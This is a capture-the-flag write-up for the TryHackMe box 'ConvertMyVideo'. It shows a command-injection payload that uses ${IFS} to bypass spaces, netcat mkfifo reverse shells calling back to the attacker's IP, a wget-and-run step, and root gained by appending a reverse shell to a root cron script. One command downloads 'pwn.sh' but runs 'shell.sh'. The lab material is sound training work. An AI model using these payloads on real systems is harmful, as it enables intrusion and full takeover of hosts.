---
title: ConvertMyVideo - Medium THM
date: 2023-11-12 08:11:31 +/-0800
categories: [writeup, tryhackme]
writeup: :title
permalink: /convert
tags: [thm, writeup, medium, linux, command injection, web, talace]     # TAG names should always be lowercase
---

- OS: **Linux**
- Difficulty: **Medium**
- Author: **Talace**

# Scanning 🤖

**threader300.py**
```
**python3 threader3000.py**
```
```
Port 22 is open
Port 80 is open
```
**nmap scan**
```
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.232.225 10.10.232.225
```
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```
# Enumeration 👀

**dirb scan**
```
dirb http://10.10.232.225/ /usr/share/wordlists/dirb/common.txt
```
```
---- Scanning URL: http://10.10.232.225/ ----
+ http://10.10.232.225/admin (CODE:401|SIZE:460)
```
# Command injection 💉
We spawn on the main page

![mainPage](/assets/convertMyVideo/mainPage.png)

I capture the request in burp.. seems not very secure
![burp1](/assets/convertMyVideo/burp1.png)

Try **'id'** command, it works!
![idCommand](/assets/convertMyVideo/idCommand.png)

I can't **'ls -la'**, it return nothing, maybe i can't have white space ? 
I have found that the var IFS, is by default a ' ', so let's try with it! 
```bash
--version;ls${IFS}-la;
```

Nice it work, from this i'm able to retrieve a lot of data, and the user by the same occasion
![userFlag](/assets/convertMyVideo/userFlag.png)

**It's cool, but we need a way to enter, let's put a reverse shell in it!**
open my listener:
```bash
nc -nvlp 4444
```

And send my reverse shell! 
```bash
rm${IFS}/tmp/f;mkfifo${IFS}/tmp/f;cat${IFS}/tmp/f|sh${IFS}-i${IFS}2>&1|nc${IFS}10.8.138.226${IFS}4444${IFS}>/tmp/f;
```

**Oh crap!? It close instantly, let's wget and run script!**😦
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.138.226 4444 >/tmp/f" >> shell.sh
```
Open a http server
```bash
python3 -m http.server 80
```
And lunch my new command, wget the script and run it with bash
```bash
--version;wget${IFS}http://10.8.138.226/pwn.sh;bash${IFS}shell.sh;
```
**Yessir! We are in!**😼

# Privilege escalation 🐧
**Upgrade the shell**
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

**Let's run pspy**
check wich one is need:
```bash
uname -a

Output: Linux dmv 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
I need the 64 bits, wget it and change rights:
```bash
wget http://10.8.138.226:81/pspy64
&&
chmod +xs pspy64
```

**Now lunch the pspy**

./pspy64, Oh interesting cron job!
```bash
2023/11/11 18:13:01 CMD: UID=0     PID=27982  | bash /var/www/html/tmp/clean.sh
```

**Let's lunch a reverseshell from it.**

Open a netcat:
```bash
nc -nvlp 4445
```
Now put the revershell in it.
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.138.226 4445 >/tmp/f" >> clean.sh
```
Go back on your netcat... Boom! Got root GG!

![ROOT](/assets/convertMyVideo/root.png)

# Resources
How to run a command without white space: [Article](https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces?source=post_page-----e012e7db996--------------------------------)